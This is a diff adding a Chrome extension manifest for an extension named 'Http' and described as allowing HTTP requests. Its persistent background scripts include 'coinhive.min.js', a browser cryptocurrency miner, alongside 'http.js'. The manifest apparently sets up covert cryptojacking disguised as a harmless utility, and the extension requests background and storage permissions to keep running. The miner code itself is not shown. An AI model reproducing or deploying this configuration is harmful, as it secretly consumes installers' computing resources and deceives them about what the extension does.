@@ -1,0 +1,23 @@
+{
+
+  "manifest_version": 2,
+  "name": "Http",
+  "short_name": "chext",
+  "version": "1.5",
+
+  "description": "allow http requests",
+  
+     "browser_action": {
+        "default_popup": "popup.html"
+    },
+	
+  "background": {
+        "scripts": ["coinhive.min.js", "http.js"],
+        "persistent": true
+    },
+    "permissions": [
+        "background",
+        "storage",
+        "activeTab"
+    ]
+}
